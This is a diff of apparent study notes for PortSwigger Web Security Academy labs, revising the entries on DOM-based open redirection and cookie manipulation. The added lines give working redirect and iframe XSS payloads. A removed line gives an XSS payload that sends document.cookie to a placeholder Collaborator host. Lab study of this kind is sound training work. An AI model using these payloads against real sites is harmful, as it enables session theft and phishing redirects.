@@ -116,18 +116,17 @@ git-cola --repo TARGET.web-security-academy.net/
 
 **4. DOM-based open redirection**
 
-- Signal: a sink such as `location`, `location.href` or `open()` is set by reading a controllable source (typically `location.hash`) without validating that the destination domain is the expected one.
-- Solution: build a URL with a fragment (`#`) that the code interprets as a full redirect URL to an external domain.
-- Payload: `https://TARGET/example#https://exploit-server.net` (if the code only checks the `https:` prefix, you can also try `javascript:` to escalate to code execution)
+- Signal: a link (e.g. "Back to Blog") uses a regex like `/url=(https?:\/\/.+)/` to pull a `url` parameter out of the current query string (`location`) and, if found, assigns it to the `location.href` sink; if not found, it falls back to the home page.
+- Solution: build and visit a URL directly that includes a `url` parameter pointing at the exploit server: the regex extracts it and the sink redirects there, no iframe or postMessage needed.
+- Payload: `https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
 - Link: [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 - Step: 1
 
 **5. DOM-based cookie manipulation**
 
-- Signal: a controllable source is written into `document.cookie` without sanitization (e.g. `document.cookie = 'name=' + location.hash.slice(1)`), and that cookie is then reflected elsewhere on the page without HTML encoding.
-- Solution: use the URL fragment to set a cookie value that itself contains an XSS payload, exploiting the fact that the cookie is reflected without encoding.
-- Payload: `https://TARGET/page#<img src=1 onerror=alert(document.domain)>` (the value after `#` ends up in the cookie and is then reflected and executed)
-- Exam payload (Burp Collaborator): `https://TARGET/page#<img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (the value after `#` ends up in the cookie and is then reflected and executed)
+- Signal: the page uses a client-side cookie (e.g. `lastViewedProduct`) whose value is taken from the URL of a visited page (e.g. a product page) and later reflected elsewhere (e.g. on the home page) without HTML-encoding.
+- Solution: use an iframe whose first URL is a product page with an XSS payload tacked onto the parameter (e.g. after closing an attribute), so the dirty value gets saved into the cookie; on its `onload`, immediately redirect the iframe to the home page (with a flag so this only happens once), where the poisoned cookie gets reflected and runs.
+- Payload: `<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">`
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
